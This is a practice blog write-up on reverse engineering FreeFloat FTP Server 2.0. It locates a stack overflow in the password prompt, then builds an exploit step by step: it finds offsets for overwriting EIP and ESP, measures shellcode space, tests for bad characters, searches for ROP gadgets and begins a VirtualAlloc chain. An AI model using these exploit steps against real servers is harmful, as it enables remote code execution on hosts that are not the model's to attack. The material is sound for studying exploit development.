---
title: "FreeFloat Ftp Server 2.0 Vuln Analysis"
excerpt_separator: "<!--more-->"
categories:
  - Blog
tags:
  - Reverse engineering
  - Penetration Testing
  - Insecure Code
---

Messy writeup reverse engineering FreeFloat Ftp Server. This is done for practise and all vulnerabilties are known.
<!--more-->

We perform a quick view of our program using IDA Pro free, we observe any command line entries, imports and etc.
We see that `recv` has been used and set hardware breakpoint. We trace this back to the function at the following offset: `00401DF9`.

![Untitled](/assets/ftpserv/Untitled.png)

We further analyse the `recv` function, lets look at the function prototype first:

```cpp
int recv(
  [in]  SOCKET s,       // the socket
  [out] char   *buf,    // buffer receiving the data
  [in]  int    len,     // lenght of the buffer
  [in]  int    flags.   // the flags e.g. MSG_PEEK, MSG_OOB, MSG_WAITALL
);
```

The following code sets the stack up for the `recv` command. We analyse each step and note the values.

```python

# Note brackets mean the value stored inside or dword ptr

.text:00401DE0 sub_401DE0 proc near
.text:00401DE0 push    esi                         # 18713a8
.text:00401DE1 mov     esi, ecx                    # ECX = 18713a8 (420)
.text:00401DE3 mov     ecx, 400h                   # ECX = 400
.text:00401DE8 push    0               ; flags     # nothing?
.text:00401DEA mov     eax, [esi+18h]              # EAX = 0
.text:00401DED mov     edx, [esi+14h]              # EDX = 018705d0
.text:00401DF0 sub     ecx, eax                    # ECX - EAX => 400 - 0
.text:00401DF2 add     edx, eax                    # EDX + EAX => 018705d0 + 0
.text:00401DF4 mov     eax, [esi]                  # EAX = 420         
.text:00401DF6 push    ecx             ; len       # ECX = 400
.text:00401DF7 push    edx             ; buf       # EDX = 018705d0
.text:00401DF8 push    eax             ; s         # 
.text:00401DF9 call    recv                        # EAX returns is 
.text:00401DFE test    eax, eax                    # we set the zero flag
.text:00401E00 jz      short loc_401E16            # jump zero

.text:00401E02 cmp     eax, 0FFFFFFFFh
.text:00401E05 jz      short loc_401E16

########################################################################################
########################################################################################

result = recv
if recv == 0
{
    //do something
}
if recv == 0

########################################################################################
########################################################################################

0:005> dd 18713a8 L1
018713a8  000001a4 # (420)

0:005> dd esi+18h
018713c0  00000000 00000000 00000000 00000000

0:005> dd esi+14h L1
018713bc  018705d0

0:005> dd 018705d0
018705d0  00000000 00000000 00000000 00000000

########################################################################################
########################################################################################

01ebfe14 000001a4 # socket
01ebfe18 018705d0 # buffer
01ebfe1c 00000400 # len
01ebfe20 00000000 # flags

0:005> dd esp L4
01ebfe14  000001a4 018705d0 00000400 00000000

000001a4 ==>  ??       # socket
018705d0 ==>  ??       # buffer
00000400 ==>  00000160       # len (400)
00000000 ==>  00401dfe       # flags

```

Based on the above we see nothing wrong or vulnerable and move on to the next piece of code, following the return to the following code snippets. We take a view of the other functions here.

![Untitled](/assets/ftpserv/Untitled%201.png)

We see there is a couple of functions begin called, we note the `recv` function is within `sub_401DE0`, and overall within an if function.

We perform further analysis, and see if we slowly step through the results where our jump is going to take us. We note our jump is not taken, and we end up at `00403063`. We then enter another procedure `sub_4020E0`, which we will analyse next. We see similiar references to our initial function referencing values from `18H` and `14H` around the stack. We later on see another procedure being called at `0040213A`. Before we analyse everything in detail, let’s see if we reach this method or not, by setting a data breakpoint and letting the flow continue. We see our function is hit and continue analysis there.

We will now continue to analyse `sub_402190` which seem to be receiving two variables. We see that there is two variables named `var_20C` and `Source`.

Our control graph also indicate we might be looking at multiple nested ifs.

![Untitled](/assets/ftpserv/Untitled%202.png)

We follow through the application until our application crashes, and then we analyse the crash function. Something we could have done way sooner.

```cpp
0:005> 
eax=00000000 ebx=00000002 ecx=00000000 edx=019118d4 esi=0040a44e edi=01911a72
eip=004028eb esp=0204fbf0 ebp=019113a8 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
FTPServer+0x28eb:
004028eb 8bcd            mov     ecx,ebp
0:005> 
eax=00000000 ebx=00000002 ecx=019113a8 edx=019118d4 esi=0040a44e edi=01911a72
eip=004028ed esp=0204fbf0 ebp=019113a8 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
FTPServer+0x28ed:
004028ed e8ee040000      call    FTPServer+0x2de0 (00402de0)
0:005> 
(7c0.f3c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=ffffffff ebx=00000002 ecx=f447d097 edx=00000000 esi=0040a44e edi=01911a72
eip=41414141 esp=0204fbf8 ebp=019113a8 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
41414141 ??              ???
```

From the above we see that our crash happens at the address `004028ed`function `sub_402DE0`.

We see the function receives a few variables, we also analyse the instructions before the call. 

```python

.text:004028EB
.text:004028EB loc_4028EB:
.text:004028EB mov     ecx, ebp
.text:004028ED call    sub_402DE0
.text:004028F2 pop     edi
.text:004028F3 pop     esi
.text:004028F4 pop     ebp
.text:004028F5 mov     eax, 1
.text:004028FA pop     ebx
.text:004028FB add     esp, 20Ch
.text:00402901 retn
.text:00402901 sub_402190 endp
.text:00402901

0:005> p
eax=00000000 ebx=00000002 ecx=019b13a8 edx=019b18d4 esi=0040a44e edi=019b1a72
eip=004028ed esp=01fefbf0 ebp=019b13a8 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
FTPServer+0x28ed:
004028ed e8ee040000      call    FTPServer+0x2de0 (00402de0)

########################################################################################
########################################################################################

.text:00402DE0 sub_402DE0 proc near
.text:00402DE0
### Variables
.text:00402DE0 var_100= byte ptr -100h.  # (256)
.text:00402DE0 var_FF= byte ptr -0FFh.   # (255)
.text:00402DE0 var_FE= byte ptr -0FEh.   # (254)
.text:00402DE0 var_FD= byte ptr -0FDh.   # (253)
.text:00402DE0 var_FC= byte ptr -0FCh.   # (252)
### Arguments taken
.text:00402DE0 arg_0= dword ptr  4
.text:00402DE0 arg_4= dword ptr  8

### Remaining code
.text:00402DE0
.text:00402DE0 sub     esp, 100h
.text:00402DE6 push    ebx
.text:00402DE7 mov     ebx, ecx
.text:00402DE9 mov     ecx, [esp+104h+arg_0]
.text:00402DF0 mov     eax, 51EB851Fh
```

It appears to be converting the value stored at `arg_0` into a string representation, and storing the result in memory at the location specified by `arg_4`.

We continue to analyse until we undercover all the variable and argument values passed to the method.  Based on the analysis the value from `arg_0` is stored into a location provided by `arg_4`. 

We also note that about `100h` of stack space is made at the beginning and several registers are stored. We also note several constant values such as `51EB851Fh (1374389535 or Q...), 66666667h (1717986919 or fffg), 0FFFFFFFFh (-1)` . Our code converts to the following pseudo c code, thanks CHAT-GPT.

```c
void sub_402DE0(unsigned int arg_0, char* arg_4) {
    char var_100, var_FF, var_FE, var_FD, var_FC;
    //allocate 100h bytes of stack space;
    //save ebx, ebp, esi, and edi registers on the stack;
    unsigned int ecx = arg_0;
    unsigned int eax = 51EB851Fh;
    ecx *= eax;
    unsigned int edx = ecx >> 5;
    eax = edx;
    eax >>= 0x1F;
    edx += eax;
    eax = 66666667h;
    char dl = (char)(edx + '0');
    var_100 = dl;
    ecx *= eax;
    eax = edx;
    unsigned int esi = 0Ah;
    eax >>= 2;
    edx = eax;
    edx >>= 0x1F;
    eax += edx;
    char* edi = arg_4;
    eax = ecx;
    ecx = esi;
    var_FD = ' ';
    var_FF = dl;
    eax /= ecx;
    ecx = ~ecx;
    eax = 0;
    //repne scasb;
    ecx = ~ecx;
    edi -= ecx;
    var_FE = dl;
    char* edx = &var_FC;
    eax = ecx;
    char* esi = edi;
    edi = edx;
    ecx >>= 2;
    //rep movsd;
    ecx = eax;
    eax = 0;
    ecx &= 3;
    edx = &var_100;
    //rep movsb;
    edi = &asc_40A588;
    ecx = ~ecx;
    //repne scasb;
    ecx = ~ecx;
    eax = &var_100;
    ecx--;
    //call WS2_32_19(ecx, eax, [ebx]);
    //restore ebx, ebp, esi, and edi registers;
    //deallocate 100h bytes of stack space;
    //return with 8 bytes;
}

```

We see another call later on `WS2_32_19` which has not resolved fully. Let’s first see if we execute until the function. We reach the function and looks like we dealing with `WS2_32!send` function. We step forward to confirm if our application crashes here.

```c
0:005> t
eax=01ddfaec ebx=018913a8 ecx=000001a0 edx=01ddfaec esi=0040a58b edi=01ddfc90
eip=00402eac esp=01ddfacc ebp=00000003 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
FTPServer+0x2eac:
00402eac e8c7080000      call    FTPServer+0x3778 (00403778)

0:005> t
eax=01ddfaec ebx=018913a8 ecx=000001a0 edx=01ddfaec esi=0040a58b edi=01ddfc90
eip=00403778 esp=01ddfac8 ebp=00000003 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
FTPServer+0x3778:
00403778 ff25a4914000    jmp     dword ptr [FTPServer+0x91a4 (004091a4)] ds:0023:004091a4={WS2_32!send (766563a0)}

00402eaa 50              push    eax
00402eab 51              push    ecx
00402eac e8c7080000      call    FTPServer+0x3778 (00403778)
00402eb1 5f              pop     edi
**00402eb2 5e              pop     esi**
00402eb3 5d              pop     ebp
00402eb4 5b              pop     ebx
00402eb5 81c400010000    add     esp,100h
00402ebb c20800          ret     8
```

Based on the above, we see we successfully continue, so the crash needs to be lower. We see as we exit from the function our memory corruption occurs.

![Untitled](/assets/ftpserv/Untitled%203.png)

From the below, we see that our function returns 8 bytes, however, the return address has been overwritten and therefore we returning to instructions we have. We don’t have our vulnerability yet, so we need to set data breakpoint at our stack location and monitor when it gets overwritten, or we can step through each instruction until we find the location.

![Untitled](/assets/ftpserv/Untitled%204.png)

We set a breakpoint to the `01f3fb08` and monitor until we find the function, we notice at the location `00402E5F` our bytes is written. We now start analysing the function in more detail as this could potentially be where our vulnerability is triggered.

![Untitled](/assets/ftpserv/Untitled%205.png)

![Untitled](/assets/ftpserv/Untitled%206.png)

We analyse the function we see the crash and we can identify the following potential issues, we also rerun dynamic analysis to identify our parameter values:

```python
.text:00402DE0 sub_402DE0 proc near
.text:00402DE0
### Variables
.text:00402DE0 var_100= byte ptr -100h.  # (256)
.text:00402DE0 var_FF= byte ptr -0FFh.   # (255)
.text:00402DE0 var_FE= byte ptr -0FEh.   # (254)
.text:00402DE0 var_FD= byte ptr -0FDh.   # (253)
.text:00402DE0 var_FC= byte ptr -0FCh.   # (252)
### Arguments taken
.text:00402DE0 arg_0= dword ptr  4
.text:00402DE0 arg_4= dword ptr  8
```

We immediately learn a couple of things, it seems that our variables are related to decimal `arg_0` (331) and the location of a buffer that contains ***********Password required for AAAAAA*********** based on this, we can determine that with the `send` command our vulnerability exist in the response sent from the server asking for the user’s password which returns our user controlled buffer.

![Untitled](/assets/ftpserv/Untitled%207.png)

However, which line, which function? We need to dig deeper into the code and on a high level we start looking for some of the following:

- Buffer Overflow: The code uses a fixed-size buffer `(var_100)` and it is possible that the input value of `arg_0` could cause a buffer overflow if it is too large, potentially leading to a crash or even arbitrary code execution.
- Hardcoded values: The code uses hardcoded values such as `51EB851Fh`, `0Ah` and it's not clear what they are used for or if they are secure.

```python
mov     ecx, [esp+104h+arg_0]
mov     eax, 51EB851Fh
imul    ecx
sar     edx, 5
mov     eax, edx
shr     eax, 1Fh
add     edx, eax
mov     [esp+10Ch+var_100], dl
```

The instruction **`mov ecx, [esp+104h+arg_0]`** loads the value of `arg_0` into the `ecx` register.
The instruction **`mov eax, 51EB851Fh`** loads the constant value `51EB851Fh` into the `eax` register.
The instruction **`imul ecx`** multiplies the value of `ecx` (which is `arg_0`) by the value of `eax` (`51EB851Fh`) and stores the result in `edx:eax`.
The instruction **`sar edx,5`** divides the value of `edx` by 32 (by shifting it to the right by 5 bits) and assigns the value to `edx`.
The instruction **`mov eax, edx`** moves the value of `edx` to `eax`.
The instruction **`shr eax, 1Fh`** shrinks the value of `eax` to the right by 31 bits.
The instruction **`add edx, eax`** adds the value of `eax` to the value of `edx` and assigns the result to `edx`.
The instruction **`mov [esp+10Ch+var_100], dl`** copies the value of dl (which is the least significant byte of `edx`) to the buffer `var_100`.

This seems to be a positive find. As `arg_0` is not validated and the buffer `var_100` is of fixed size, if `arg_0` is large enough, it can cause the buffer `var_100` to overflow and overwrite other important data or even execute arbitrary code. We switch to dynamic analysis and see that the message sent back, returns `112` bytes, which is the buffer copied into the `100` bytes fixed size buffer. 

```python
0:001> dW 001c18d4 
001c18d4  6150 7373 6f77 6472 7220 7165 6975 6572  Password require
001c18e4  2064 6f66 2072 4141 4141 4141 4141 4141  d for AAAAAAAAAA
001c18f4  4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
001c1904  4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
001c1914  4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
001c1924  4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
001c1934  4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
001c1944  4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
0:001> .formats 0000014b 
Evaluate expression:
  Hex:     0000014b
  Decimal: 331
  Octal:   00000000513
  Binary:  00000000 00000000 00000001 01001011
  Chars:   ...K
  Time:    Thu Jan  1 00:05:31 1970
  Float:   low 4.6383e-043 high 0
  Double:  1.63536e-321
0:001> ? 001c1944 - 001c18d4  
Evaluate expression: 112 = 00000070
```

We have successfully found our overflow location.

We redo the the check by changing our buffer size from `240` bytes to `20` bytes. We see that the buffer reduced to `32` bytes and no memory violations occur. 

![Untitled](/assets/ftpserv/Untitled%208.png)

We continue with our exploit build and our shellcode now looks similiar to the below:

```python
FILLER = b"\x41" * 230
EIP = b"\x42" * 4
ESP = b"\x43" * 16
```

Effectively we see that we can successfully overwrite EIP and even ESP. EIP is within our control filled with BBBBBBBB and we also see ESP has been overwritten with our CCCCCC value. 

```python
0:001> r
eax=00000117 ebx=00000002 ecx=1caf15b8 edx=775938b0 esi=0040a44e edi=001a1a2e
eip=42424242 esp=01e7fbf8 ebp=001a13f0 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
42424242 ??              ???

0:001> dd esp
01e7fbf8  43434343 43434343 000a0d2e 001a13f0
01e7fc08  001a05d0 7758fcda 73b0d08e 000001b8
01e7fc18  00000001 00000000 01e7fe80 01e7fd14
01e7fc28  73b0d0e6 00000000 00e7fc68 00000000
01e7fc38  00000000 005f7da0 00000000 00000000
01e7fc48  ffb3b4c0 ffffffff 73b0dad0 000001b4
01e7fc58  00000000 000001b8 00000000 00000000
01e7fc68  00000000 00000000 01e7fc98 bcbf54f9
```

We now proceed in finding how much space we have for our shellcode. We therefore test around 500 bytes.

```python
0:005> r
eax=00000405 ebx=00000002 ecx=920201f8 edx=775938b0 esi=0040a44e edi=01871d1c
eip=42424242 esp=01fdfbf8 ebp=018713f0 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
42424242 ??              ???

0:005> dd esp
01fdfbf8  43434343 43434343 78343478 34783434
01fdfc08  34347834 78343478 34783434 34347834
01fdfc18  78343478 34783434 34347834 78343478
01fdfc28  34783434 34347834 78343478 34783434
01fdfc38  34347834 78343478 34783434 34347834
01fdfc48  78343478 34783434 34347834 78343478
01fdfc58  34783434 34347834 78343478 34783434
01fdfc68  34347834 78343478 34783434 34347834
```

From the above we immediately note that we see our value 43 right after ESP, however, the content seems to be mangled. It could be our application is parsing the code as `DWORD` and not `Unicode`. We therefore test by changing our shellcode as follow.

```python
SHELLC = b"D" * (500 - len(FILLER) - len(EIP) - len(ESP))
```

We can see that our shellcode successfully displays our `DDDDDDD` string. With some quick calculations we also determine we have about 240 bytes for our shellcode.

```python
0:005> r
eax=ffffffff ebx=00000002 ecx=f2f8ac34 edx=00000000 esi=0040a44e edi=017a1b28
eip=42424242 esp=01edfbf8 ebp=017a13f0 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
42424242 ??              ???
0:005> dd esp L10
01edfbf8  43434343 43434343 44444444 44444444
01edfc08  44444444 44444444 44444444 44444444
01edfc18  44444444 44444444 44444444 44444444
01edfc28  44444444 44444444 44444444 44444444

0:005> dW ESP L10
01edfbf8  4343 4343 4343 4343 4444 4444 4444 4444  CCCCCCCCDDDDDDDD
01edfc08  4444 4444 4444 4444 4444 4444 4444 4444  DDDDDDDDDDDDDDDD

0:005> ? 01edfce8 - ESP 
Evaluate expression: 240 = 000000f0
```

Considering our string conversion, we can effectively move our shellcode up to 900 bytes and rerun our test. We learn that we have around 640 bytes, more than enough.

```python
0:005> ? 01fdfe78 - ESP
Evaluate expression: 640 = 00000280
```

We’ll also quickly check for bad characters to ensure we don’t run into any issues going forward. 

```python
	BADCHARS = (
  b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

	INBUFFER = FILLER + EIP + ESP + BADCHARS
```

We learn the following characters are bad chars `x0a`, `x0d`, `x00`. 

So far we have our control over EIP, overwrite ESP, and around 500 bytes for shellcode. Next steps we need to redirect the execution flow in order to get our shellcode running. Our shellcode will sit in `ESP`, however, on each crash the location will be different and we need to enforce `JMP ESP` instructions to ensure our `ESP` payload gets executed. We therefore need to find a location in the code that has the instructions and point the `EIP` register to it. Let’s revisit the protections and we see that the binary has been enabled with DEP.

```python
0:004> !nmod
00400000 0040f000 FTPServer            /SafeSEH OFF                C:\3.Examples\ftpserver - Done\FTPServer.exe
723d0000 7244b000 uxtheme              /SafeSEH ON  /GS *ASLR *DEP C:\Windows\system32\uxtheme.dll
725c0000 725e3000 dwmapi               /SafeSEH ON  /GS *ASLR *DEP C:\Windows\system32\dwmapi.dll
732d0000 73328000 mswsock              /SafeSEH ON  /GS *ASLR *DEP C:\Windows\system32\mswsock.dll
73950000 73964000 profapi              /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\profapi.dll
73970000 7397e000 kernel_appcore       /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\kernel.appcore.dll
73990000 739d5000 powrprof             /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\powrprof.dll
73b70000 73ba8000 cfgmgr32             /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\cfgmgr32.dll
73bb0000 73c07000 bcryptPrimitives     /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\bcryptPrimitives.dll
73c10000 73de8000 KERNELBASE           /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\KERNELBASE.dll
73df0000 743b4000 windows_storage      /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\windows.storage.dll
743c0000 74522000 gdi32full            /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\gdi32full.dll
74580000 74696000 ucrtbase             /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\ucrtbase.dll
746a0000 746ba000 win32u               NO_SEH       /GS *ASLR *DEP C:\Windows\System32\win32u.dll
746c0000 7473c000 msvcp_win            /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\msvcp_win.dll
747e0000 74806000 IMM32                /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\IMM32.DLL
74810000 74898000 shcore               /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\shcore.dll
748a0000 748c2000 GDI32                NO_SEH       /GS *ASLR *DEP C:\Windows\System32\GDI32.dll
749a0000 74a33000 OLEAUT32             /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\OLEAUT32.dll
74a40000 74ad5000 KERNEL32             /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\KERNEL32.DLL
74ae0000 74c4f000 USER32               /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\USER32.dll
74ce0000 74f25000 combase              /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\combase.dll
74f30000 74fa8000 advapi32             /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\advapi32.dll
74fb0000 74ff3000 sechost              /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\sechost.dll
75000000 750c7000 RPCRT4               /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\RPCRT4.dll
750f0000 75234000 MSCTF                /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\MSCTF.dll
757f0000 758ad000 msvcrt               /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\msvcrt.dll
758b0000 75916000 WS2_32               /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\WS2_32.dll
75a60000 76d94000 SHELL32              /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\SHELL32.dll
76da0000 76de5000 shlwapi              /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\shlwapi.dll
76ef0000 7707f000 ntdll                /SafeSEH ON  /GS *ASLR *DEP C:\Windows\SYSTEM32\ntdll.dll

*DEP/*ASLR means that these modules are compatible with ASLR/DEP
```

![Untitled](/assets/ftpserv/Untitled%209.png)

### **Bypassing DEP and ASLR**

Let’s quickly recap where we are at:

- We’ve identified our vulnerability by using dynamic and static analysis
- We’ve confirmed control over EIP and EPS registers
- We’ve identified space for our shellcode, and the buffer size

Looking at our module, we’ll note that it unfortunately starts with a null-byte, also terminates at one. This could be problematic as we’ve learned null bytes are part of our bad chars and the address currently has the null byte in the uppermost byte. We therefore have to face ASLR and DEP and see if we can’t bypass.

```python
0:004> lmD
start    end        module name
**00**400000 **00**40f000   FTPServer C (no symbols)
```

We need to now utilise the control over the registers to jump to our shellcode. This will by tricky, as we’ve seen based on the above, DEP has been enabled. Considering that we now have to deal with DEP, we will have to develop a ROP chain in order to reach our shellcode. We therefore first complete our ROP table:

| Question | Answer |
| --- | --- |
| Technique | VirtualAlloc |
| ROP Gadgets | RP++ |
| Execution | Stack pivoting, as a direct RET overwrite. Require pointer to RET. |
| Craft |  |
|  |  |

We load up RP++ and search for some ROP chains that we can work with.  We working with the following bad chars `x0a`, `x0d`, `x00`. 

```python
 RP++.exe -f ftpserver.exe -r 5 > rop.txt
```

[RopsFTPServer](/assets/ftpserv/Untitled.txt)

We start by analysing the output and we’ll need to start aligning the stack so that we can call `VirtualAlloc`.

```python
LPVOID VirtualAlloc(
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType, 
  [in]           DWORD  flProtect
);

Return address => shellcode on stack
lpAddress => point to address of  previously commitd memory page e.g. shellcode on stack
dwSize => 0x01 to 0x1000 ; size of the memory region we want to change, any value between 
flAllocationType => 0x00001000 ; which is MEM_COMMIT
flProtect => 0x00000040 ; 0x40 which is PAGE_EXECUTE_READWRITE

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

va  = pack("<L", (0x45454545)) # dummy VirutalAlloc Address
va += pack("<L", (0x46464646)) # Shellcode Return Address
va += pack("<L", (0x47474747)) # # dummy Shellcode Address
va += pack("<L", (0x48484848)) # dummy dwSize 
va += pack("<L", (0x49494949)) # # dummy flAllocationType 
va += pack("<L", (0x51515151)) # dummy flProtect
```